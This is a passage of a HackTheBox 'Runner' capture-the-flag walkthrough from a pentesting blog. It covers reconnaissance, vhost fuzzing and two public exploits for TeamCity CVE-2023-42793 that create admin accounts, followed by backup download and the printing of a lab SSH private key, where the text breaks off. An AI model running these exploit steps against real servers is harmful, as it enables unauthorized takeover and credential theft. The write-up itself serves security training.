<!doctype html><html lang=en><head><title>HTB Runner WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Runner' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Runner WriteUp"><meta name=twitter:description content="HackThebox 'Runner' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/runner/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Runner WriteUp"><meta property="og:description" content="HackThebox 'Runner' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-24T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-24T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Portainer"><meta property="article:tag" content="Local Port Forwarding"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/runner/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.064032bdabf71803ac209bfac7afe4609898265440caa172acba739538eb4845.css integrity="sha256-BkAyvav3GAOsIJv6x6/kYJiYJlRAyqFyrLpzlTjrSEU=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/runner/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/runner/>HTB Runner WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-24T00:00:00Z>24 August, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
11-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/portainer/>Portainer</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/local-port-forwarding/>Local Port Forwarding</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/teamcity/>Teamcity</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/searchsploit/>Searchsploit</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ffuf/>Ffuf</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a></span></div></div></header><div class=post-content><h1 id=runner----hackthebox>Runner &ndash; HackTheBox
<a class=heading-link href=#runner----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Runner&rsquo; Avatar" src=/pentesting/images/Runner_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Runner</code> is a medium difficulty box from <code>HackTheBox</code> platform. After searching for <code>vhosts</code> in this machine, we find one that is running a vulnerable version of <code>TeamCity</code> to <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-42793 class=external-link target=_blank rel=noopener>CVE-2023-42793</a> which allow us to create/get credentials from users within this service. Inside this service, we are able to find some backup files that contain a <code>SSH</code> key for one user, gaining initial access to the victim machine. Once inside, we see that it is running <code>Portainer</code> &ndash;a tool to administer containers such as <code>Docker</code>&ndash;, which we can log in thanks to a password also contained into the backup files. Once inside this new internal service, we are able to mount a copy of the system into a container and read the contents of priviledges files.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Starting with <code>Nmap</code> scan shows 3 ports open: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code> and <code>8080</code> apparently running <code>Nagios XI</code> service.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,8000 10.10.11.13 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 21:36 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.13
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.19s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE     VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http        nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://runner.htb/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>8000/tcp open  nagios-nsca Nagios NSCA
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
</span></span></span></code></pre></div><ul><li>From the scan I can see that connection to site at port <code>80</code> redirects to <code>http://runner.htb</code>, so I add this domain to my <code>/etc/hosts</code> file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.13 runner.htb&#39; | sudo tee -a /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.13 runner.htb
</span></span></span></code></pre></div><ul><li>Once added this new subdomain, visiting <code>http://runner.htb</code> shows a simple website about code optimization:</li></ul><p><img alt="Runner 1" src=/pentesting/images/Runner_1.png></p><ul><li>Many of the buttons in this page do not work and we are only able to send a mail to <code>sales@runner.htb</code>. Since there is nothing interesting here, I will start searching for subdomains that could be applying <code>vhosting</code> with <code>ffuf</code>. Now, the &ldquo;tricky&rdquo; part is that we usually use the dictionary <code>subdomains-top1million-XXXX.txt</code> from <code>SecLists</code>, but this time we should apply another different like <code>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code>. Doing this we have:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://runner.htb/ -H &#39;Host: FUZZ.runner.htb&#39;  -fs 154 -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://runner.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.runner.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 55
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response size: 154
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 827ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [100000/100000] :: Job [1/1] :: 341 req/sec :: Duration: [0:04:36] :: Errors: 0 ::
</span></span></span></code></pre></div><p>where we have found a new domain: <code>teamcity.runner.htb</code></p><ul><li>We add this new subdomain to our <code>/etc/hosts</code> file, so now it looks like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ tail -n 1 /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.13 runner.htb teamcity.runner.htb
</span></span></span></code></pre></div><ul><li>Visiting <code>http://teamcity.runner.htb</code> redirects to its <code>/login.html</code> page. The new site looks like:</li></ul><p><img alt="Runner 2" src=/pentesting/images/Runner_2.png></p><p>The site is, apparently, using <code>TeamCity</code></p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>TeamCity</code> is used to build and test software products in an automated manner. It provides rapid feedback on every code change, reduces code integration problems, and leads to more effective teamwork. Many popular games, websites, banking systems, and all <code>JetBrains</code> products are built with <code>TeamCity</code></div></div><hr><h3 id=alternative-1-github-repository-exploit>Alternative 1: Github repository exploit
<a class=heading-link href=#alternative-1-github-repository-exploit><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><ul><li>Searching for <code>TeamCity exploit</code> on Google leads us to <a href=https://github.com/H454NSec/CVE-2023-42793 class=external-link target=_blank rel=noopener>this Github Repository</a> that is based on <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-42793 class=external-link target=_blank rel=noopener>CVE-2023-42793</a>. Basically, this exploit allows us to create a new user with administrative privileges since we have an endpoint <code>/app/rest/users/id:1/tokens/RPC2</code> exposed without needing authentication; from here one could obtain an authentication token (for admin, for example) and apply a <code>Remote Code Execution</code>. Based on the page describing the vulnerability, the vulnerable versions are <code>Up to (excluding) 2023.05.4</code>. We can see in the login page that the version is <code>2023.05.3</code>, so it should be vulnerable. We clone the mentioned repository and run it:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/H454NSec/CVE-2023-42793.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;CVE-2023-42793&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 28, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (28/28), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (27/27), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 28 (delta 12), reused 0 (delta 0), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (28/28), 10.79 KiB | 216.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (12/12), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 CVE-2023-42793.py -u http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] http://teamcity.runner.htb/login.html [H454NSec6009:@H454NSec]
</span></span></span></code></pre></div><p>where we might have credentials: <code>H454NSec6009:@H454NSec</code></p><hr><h3 id=alternative-2-create-a-new-admin-user-using-searchsploit-exploit>Alternative 2: Create a new admin user using <code>SearchSploit</code> exploit
<a class=heading-link href=#alternative-2-create-a-new-admin-user-using-searchsploit-exploit><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><ul><li>Using <code>SearchSploit</code> we have</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit teamcity
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go> Exploit Title                                     |  Path
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>JetBrains TeamCity 2018.2.4 - Remote Code Executio | java/remote/47891.txt
</span></span></span><span class=line><span class=cl><span class=go>JetBrains TeamCity 2023.05.3 - Remote Code Executi | java/remote/51884.py
</span></span></span><span class=line><span class=cl><span class=go>TeamCity &lt; 9.0.2 - Disabled Registration Bypass    | multiple/remote/46514.js
</span></span></span><span class=line><span class=cl><span class=go>TeamCity Agent - XML-RPC Command Execution (Metasp | multiple/remote/45917.rb
</span></span></span><span class=line><span class=cl><span class=go>TeamCity Agent XML-RPC 10.0 - Remote Code Executio | php/webapps/48201.py
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Shellcodes: No Results
</span></span></span></code></pre></div><p>Where exploit <code>51884</code> seems promising.</p><ul><li>I copy this script and run it. Apparently, the first time we run it it recollects info about the site:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit -m 51884
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Copied to: /home/gunzf0x/HTB/HTBMachines/Medium/Runner/exploits/51884.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ mv 51884.py teamcity_exploit.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 teamcity_exploit.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>usage: teamcity_exploit.py [-h] -u URL [-v]
</span></span></span><span class=line><span class=cl><span class=go>teamcity_exploit.py: error: the following arguments are required: -u/--url
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ python3 teamcity_exploit.py -u http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Token already exists
</span></span></span><span class=line><span class=cl><span class=go>Previous token deleted successfully
</span></span></span><span class=line><span class=cl><span class=go>run this command again for creating new token &amp; admin user.
</span></span></span></code></pre></div><p>and re-running it we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 teamcity_exploit.py -u http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Token: eyJ0eXAiOiAiVENWMiJ9.YktIb0JhZ09yVVcxd011MUJNNXlXMWtzNkk0.ZTlkODdkZTgtNWI5YS00OWE0LWEzMTgtYzNjZjU3MDRhMzBk
</span></span></span><span class=line><span class=cl><span class=go>Successfully exploited!
</span></span></span><span class=line><span class=cl><span class=go>URL: http://teamcity.runner.htb
</span></span></span><span class=line><span class=cl><span class=go>Username: city_adminE7xn
</span></span></span><span class=line><span class=cl><span class=go>Password: Main_password!!**
</span></span></span></code></pre></div><hr><ul><li>Now, back to the login page we can log in this panel with the credentials <code>H454NSec6009:@H454NSec</code> or we could use the user created from the <code>SearchSploit</code> exploit. Login with first credentials in the <code>TeamCity</code> panel we have then:</li></ul><p><img alt="Runner 3" src=/pentesting/images/Runner_3.png></p><ul><li>If we click on <code>Administration</code> at the top left panel we have the following:</li></ul><p><img alt="Runner 4" src=/pentesting/images/Runner_4.png></p><ul><li>Then, at the left side, scrolling down to <code>Server Administration</code> section I can see a <code>Backup</code> option. Clicking on it we can see:</li></ul><p><img alt="Runner 5" src=/pentesting/images/Runner_5.png></p><p>Clicking on <code>Start Backup</code> creates a <code>.zip</code> file that can be downloaded.</p><ul><li>Downloading and decompressing it shows us multiple files:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ unzip TeamCity_Backup_20240529_025322.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Archive:  TeamCity_Backup_20240529_025322.zip
</span></span></span><span class=line><span class=cl><span class=go>TeamCity data backup; ZIP factory in use: memory-conservative (dynamic, shared); compression level -1.
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 296
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 6 gunzf0x gunzf0x   4096 May 28 22:57 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x   4096 May 28 22:57 ..
</span></span></span><span class=line><span class=cl><span class=go>---------- 1 gunzf0x gunzf0x      6 May 29  2024 charset
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 7 gunzf0x gunzf0x   4096 May 28 22:57 config
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x   4096 May 28 22:57 database_dump
</span></span></span><span class=line><span class=cl><span class=go>---------- 1 gunzf0x gunzf0x    630 May 29  2024 export.report
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x   4096 May 28 22:57 metadata
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x   4096 May 28 22:57 system
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 264776 May 28 22:56 TeamCity_Backup_20240529_025322.zip
</span></span></span><span class=line><span class=cl><span class=go>---------- 1 gunzf0x gunzf0x     92 May 29  2024 version.txt
</span></span></span></code></pre></div><ul><li>Using <code>find</code> I search for file names that could be interesting, like something that could be named <code>id_rsa</code>. And find something:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ find . -name &#34;*id_rsa*&#34; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
</span></span></span></code></pre></div><ul><li>And reading it shows a <code>SSH</code> key:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ chmod 600 ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cat ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span></span><span class=line><span class=cl><span class=go>NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
</span></span></span><span class=line><span class=cl><span class=go>htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
</span></span></span><span class=line><span class=cl><span class=go>njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
</span></span></span><span class=line><span class=cl><span class=go>zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy
</span></span></span><span class=line><span class=cl><span class=go>/R2GQpBWUDB9rUS+mtHpm4c3786g11IPZo+74I7BhOn1Iz2E5KO0tW2jefylY2MrYgOjjq
</span></span></span><span class=line><span class=cl><span class=go>5fj0Fz3eoj4hxtZyuf0GR8Cq1AkowJyDP02XzIvVZKCMDgVNAMH5B7COTX8CjUzc0vuKV5
</span></span></span><span class=line><span class=cl><span class=go>iLSi+vRx6vYQpQv4wlh1H4hUlgaVSimoAqizJPUqyAi9oUhHXGY71x5gCUXeULZJMcDYKB
</span></span></span><span class=line><span class=cl><span class=go>Z2zzex3+iPBYi9tTsnCISXIvTDb32fmm1qRmIRyXAAAFgGL91WVi/dVlAAAAB3NzaC1yc2
</span></span></span><span class=line><span class=cl><span class=go>EAAAGBAJZNq0YZu09nYNs9/mOoqEjlbM7zZQOMEUuLcvKqxjEgqZ2chCEj5YbRxqU7tKBi
</span></span></span><span class=line><span class=cl><span class=go>NdRU7p+x80I+zq3u2DAvkrDCJUu/DBlNqIG9E6dmzmOUTdf1/TIiv0hOJYk544T1NRagSH
</span></span></span><span class=line><span class=cl><span class=go>sZlypYEv47+e1lLXOQrIE1BmJKWl+nE9oHojahy5weUA/mSiVgX5Rej/a07c5BHXFmCrQ6
</span></span></span><span class=line><span class=cl><span class=go>dD4XLtRVFXkCTqW9d8Py9BhosmtkZGYKyMF0epd2Al/pgURX4URRy5nf5YMv0dhkKQVlAw
</span></span></span><span class=line><span class=cl><span class=go>fa1EvprR6ZuHN+/OoNdSD2aPu+COwYTp9SM9hOSjtLVto3n8pWNjK2IDo46uX49Bc93qI+
</span></span></span><span class=line><span class=cl><span class=go>IcbWcrn9BkfAqtQJKMCcgz9Nl8yL1WSgjA4FTQDB+Qewjk1/Ao1M3NL7ileYi0ovr0cer2
</span></span></span><span class=line><span class=cl><span class=go>EKUL+MJYdR+IVJYGlUopqAKosyT1KsgIvaFIR1xmO9ceYAlF3lC2STHA2CgWds83sd/ojw
</span></span></span><span class=line><span class=cl><span class=go>WIvbU7JwiElyL0w299n5ptakZiEclwAAAAMBAAEAAAGABgAu1NslI8vsTYSBmgf7RAHI4N
</span></span></span><span class=line><span class=cl><span class=go>BN2aDndd0o5zBTPlXf/7dmfQ46VTId3K3wDbEuFf6YEk8f96abSM1u2ymjESSHKamEeaQk
</span></span></span><span class=line><span class=cl><span class=go>lJ1wYfAUUFx06SjchXpmqaPZEsv5Xe8OQgt/KU8BvoKKq5TIayZtdJ4zjOsJiLYQOp5oh/
</span></span></span><span class=line><span class=cl><span class=go>1jCAxYnTCGoMPgdPKOjlViKQbbMa9e1g6tYbmtt2bkizykYVLqweo5FF0oSqsvaGM3MO3A
</span></span></span><span class=line><span class=cl><span class=go>Sxzz4gUnnh2r+AcMKtabGye35Ax8Jyrtr6QAo/4HL5rsmN75bLVMN/UlcCFhCFYYRhlSay
</span></span></span><span class=line><span class=cl><span class=go>yeuwJZVmHy0YVVjxq3d5jiFMzqJYpC0MZIj/L6Q3inBl/Qc09d9zqTw1wAd1ocg13PTtZA
</span></span></span><span class=line><span class=cl><span class=go>mgXIjAdnpZqGbqPIJjzUYua2z4mMOyJmF4c3DQDHEtZBEP0Z4DsBCudiU5QUOcduwf61M4
</span></span></span><span class=line><span class=cl><span class=go>CtgiWETiQ3ptiCPvGoBkEV8ytMLS8tx2S77JyBVhe3u2IgeyQx0BBHqnKS97nkckXlAAAA
</span></span></span><span class=line><span class=cl><span class=go>wF8nu51q9C0nvzipnnC4obgITpO4N7ePa9ExsuSlIFWYZiBVc2rxjMffS+pqL4Bh776B7T
</span></span></span><span class=line><span class=cl><span class=go>PSZUw2mwwZ47pIzY6NI45mr6iK6FexDAPQzbe5i8gO15oGIV9MDVrprjTJtP+Vy9kxejkR
</span></span></span><span class=line><span class=cl><span class=go>3np1+WO8+Qn2E189HvG+q554GQyXMwCedj39OY71DphY60j61BtNBGJ4S+3TBXExmY4Rtg
</span></span></span><span class=line><span class=cl><span class=go>lcZW00VkIbF7BuCEQyqRwDXjAk4pjrnhdJQAfaDz/jV5o/cAAAAMEAugPWcJovbtQt5Ui9
</span></span></span><span class=line><span class=cl><span class=go>WQaNCX1J3RJka0P9WG4Kp677ZzjXV7tNufurVzPurrxyTUMboY6iUA1JRsu1fWZ3fTGiN/
</span></span></span><span class=line><span class=cl><span class=go>TxCwfxouMs0obpgxlTjJdKNfprIX7ViVrzRgvJAOM/9WixaWgk7ScoBssZdkKyr2GgjVeE
</span></span></span><span class=line><span class=cl><span class=go>7jZoobYGmV2bbIDkLtYCvThrbhK6RxUhOiidaN7i1/f1LHIQiA4+lBbdv26XiWOw+prjp2
